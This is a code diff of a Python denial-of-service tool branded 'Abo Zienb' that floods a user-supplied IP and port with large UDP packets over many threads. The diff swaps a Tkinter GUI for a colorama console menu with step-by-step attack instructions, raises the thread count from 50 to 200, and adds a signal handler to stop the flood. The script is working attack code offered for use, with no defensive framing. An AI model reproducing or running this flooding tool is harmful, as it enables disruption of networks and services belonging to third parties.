@@ -1,49 +1,15 @@
+import signal
+import sys
 import socket
 import random
 import time
 import threading
-from tkinter import Tk, Label, Button, Entry, StringVar
-import logging
+from colorama import init, Fore
 
-logging.basicConfig(filename="attack_logs.txt", level=logging.INFO)
+init(autoreset=True)
 
-class AttackGUI:
-    def __init__(self, root):
-        self.root = root
-        self.root.title("Abo Zienb - Attack Tool")
-        
-        self.ip_label = Label(root, text="Enter Target IP:")
-        self.ip_label.grid(row=0, column=0)
-        
-        self.ip_entry = Entry(root)
-        self.ip_entry.grid(row=0, column=1)
-        
-        self.port_label = Label(root, text="Enter Target Port:")
-        self.port_label.grid(row=1, column=0)
-        
-        self.port_entry = Entry(root)
-        self.port_entry.grid(row=1, column=1)
-        
-        self.time_label = Label(root, text="Enter Attack Duration (seconds):")
-        self.time_label.grid(row=2, column=0)
-        
-        self.time_entry = Entry(root)
-        self.time_entry.grid(row=2, column=1)
-        
-        self.attack_button = Button(root, text="Start Attack", command=self.start_attack)
-        self.attack_button.grid(row=3, column=0, columnspan=2)
-        
-        self.status_label = Label(root, text="Status: Waiting for input...")
-        self.status_label.grid(row=4, column=0, columnspan=2)
-
-    def start_attack(self):
-        ip = self.ip_entry.get()
-        port = self.port_entry.get()
-        duration = self.time_entry.get()
-        
-        self.status_label.config(text="Status: Attack in progress...")
-        logging.info(f"Started attack on {ip}:{port} for {duration} seconds.")
-        threading.Thread(target=start_attack, args=(ip, port, int(duration))).start()
+attack_running = True
+attack_status = "Waiting for input..."
 
 def colored_text(text):
     colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.CYAN, Fore.MAGENTA, Fore.WHITE]
@@ -51,26 +17,36 @@ def colored_text(text):
     return colored
 
 def show_banner():
-    name = "ABO ZIENB"  # جعل الكلمة كبيرة
+    name = "Abo Zienb"
     print(Fore.BLACK + Fore.WHITE + "╔════════════════════════════════╗")
-    print(Fore.WHITE + "║", colored_text(name).center(30), "║")  # جعل الاسم في المنتصف
+    print(Fore.WHITE + "║", colored_text(name).center(30), "║")
     print(Fore.BLACK + Fore.WHITE + "╚════════════════════════════════╝")
+    print(Fore.GREEN + "Instructions:")
+    print(Fore.CYAN + "1. Enter the IP of the target.")
+    print(Fore.CYAN + "2. Enter the Port number of the target.")
+    print(Fore.CYAN + "3. Enter the duration of the attack in seconds.")
+    print(Fore.CYAN + "4. To stop the attack at any time, press CTRL+Z.")
+
+def show_attack_status():
+    global attack_status
+    print(Fore.YELLOW + "\nCurrent Attack Status:")
+    print(Fore.CYAN + f"Attack running: {attack_status}")
 
 def get_input():
-    print(Fore.YELLOW + "Come in IP:")
-    ip = input(Fore.CYAN + "Enter target IP: ")
+    print(Fore.YELLOW + "Enter Target IP:")
+    ip = input(Fore.CYAN + "IP: ")
     
-    print(Fore.YELLOW + "Come in Port:")
-    port = input(Fore.CYAN + "Enter target Port: ")
+    print(Fore.YELLOW + "Enter Target Port:")
+    port = input(Fore.CYAN + "Port: ")
     
-    print(Fore.YELLOW + "Enter the time:")
-    time = input(Fore.CYAN + "Enter attack duration (seconds): ")
+    print(Fore.YELLOW + "Enter Attack Duration (seconds):")
+    time = input(Fore.CYAN + "Duration: ")
     
     return ip, port, time
 
 def read_user_agents(file):
     with open(file, 'r') as f:
-        return [line.strip() for line in f.readlines()]
+        return [line.strip() for line in f.readlines() if "Mozilla" in line]
 
 def udp_flood(ip, port, dur):
     user_agents = read_user_agents('ua.txt')
@@ -80,7 +56,7 @@ def udp_flood(ip, port, dur):
     clock = (lambda: 0, time.time)[dur > 0]
     duration = (1, (clock() + dur))[dur > 0]
     
-    while True:
+    while attack_running:
         user_agent = random.choice(user_agents)
         bytes = user_agent.encode('utf-8') + b" " * (65500 - len(user_agent))  
         port = (random.randint(1, 65535), port)[randport]
@@ -90,32 +66,41 @@ def udp_flood(ip, port, dur):
         else:
             break
 
-def start_attack(ip, port, time, num_threads=50):
+def start_attack(ip, port, time, num_threads=200):
+    global attack_status
     threads = []
-    print(f"Attack started on {ip}:{port} for {time} seconds...")
+    
+    print(Fore.GREEN + f"\nAttack started on {ip}:{port} for {time} seconds.")
+    attack_status = "Attack in progress..."
+    
     for i in range(num_threads):
         thread = threading.Thread(target=udp_flood, args=(ip, port, time))
         threads.append(thread)
         thread.start()
-    
+
     for thread in threads:
         thread.join()
     
-    print("Attack completed.")
-    logging.info(f"Attack completed on {ip}:{port}.")
+    attack_status = "Attack completed."
+    print(Fore.GREEN + "Attack completed.")
 
 def show_info():
     print(Fore.GREEN + "\nInformation:")
     print(Fore.CYAN + "Age: 29")
     print(Fore.CYAN + "Telegram: @eee_59")
 
-if __name__ == "__main__":
-    root = Tk()
-    gui = AttackGUI(root)
-    root.mainloop()
+def stop_attack(sig, frame):
+    global attack_running
+    attack_running = False
+    print(Fore.RED + "\nAttack stopped successfully.")
+    sys.exit(0)
 
+signal.signal(signal.SIGTSTP, stop_attack)
+
+if __name__ == "__main__":
     show_banner()
     show_info()
     
     ip, port, time = get_input()
+    
     start_attack(ip, port, int(time))
